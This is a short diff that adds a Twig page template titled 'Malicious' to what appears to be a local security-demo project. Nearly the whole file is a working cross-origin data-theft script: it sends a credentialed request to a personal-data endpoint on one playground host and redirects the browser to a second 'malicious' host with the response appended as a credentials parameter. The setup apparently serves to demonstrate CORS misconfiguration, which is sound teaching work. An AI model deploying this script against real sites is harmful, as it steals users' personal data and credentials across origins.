@@ -1,0 +1,17 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}Malicious 😈{% endblock %}
+
+{% block body %}
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','http://security-playground.localhost/personal-data',true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            location='//malicious-playground.localhost/malicious-show?credentials='+this.responseText;
+        };
+    </script>
+{% endblock %}
